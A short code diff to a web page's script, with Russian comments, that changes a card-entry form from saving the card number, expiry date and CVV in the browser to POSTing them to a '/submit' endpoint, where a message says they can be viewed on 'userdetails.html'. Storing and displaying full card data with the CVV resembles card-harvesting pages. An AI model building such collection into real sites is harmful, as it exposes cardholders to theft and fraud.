@@ -86,15 +86,22 @@
             const expiry = expiryEl.value.trim();
             const cvv = cvvEl.value.trim();
 
-            const entry = { cardNumber, expiry, cvv, timestamp: new Date().toISOString() };
-
-            // сохранить в localStorage
-            const existing = JSON.parse(localStorage.getItem('bankData') || '[]');
-            existing.push(entry);
-            localStorage.setItem('bankData', JSON.stringify(existing));
-
-            alert('Данные сохранены. Просмотреть можно на странице "userdetails.html".');
-            this.reset();
+            // отправить на сервер
+            fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cardNumber, expiry, cvv })
+            })
+                .then(r => r.json())
+                .then(res => {
+                    if (res.status === 'ok') {
+                        alert('Данные отправлены на сервер. Просмотреть можно на странице "userdetails.html".');
+                        cardForm.reset();
+                    } else {
+                        alert('Ошибка при сохранении');
+                    }
+                })
+                .catch(() => alert('Ошибка сети'));
         });
     </script>
 </body>
